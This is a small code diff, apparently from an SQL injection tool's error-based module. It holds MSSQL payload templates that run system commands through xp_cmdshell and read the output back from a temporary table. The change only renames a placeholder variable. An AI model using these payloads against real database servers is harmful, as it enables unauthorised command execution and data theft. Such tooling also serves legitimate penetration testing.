@@ -49,7 +49,7 @@ class error_based():
 #Insert xp_cmdshell output to temp table
     "insert_result" : "declare @cmd_hex varchar(8000) select @cmd_hex=${cmd};insert xtmptable exec master..xp_cmdshell @cmd_hex", 
 #Exec xp_cmdshell encoded
-    "exec_cmdshell" : "declare @cmd_hex varchar(8000) select @cmd_hex=${cmd_hex};exec master..xp_cmdshell @cmd_hex", 
+    "exec_cmdshell" : "declare @cmd_hex varchar(8000) select @cmd_hex=${hex};exec master..xp_cmdshell @cmd_hex", 
 #Get count of rows from temp table
     "tmp_count" : "(select top 1 ${MS}+cast(count(*) as varchar)+${MS} from xtmptable)", 
 #Get string from temp table by row number
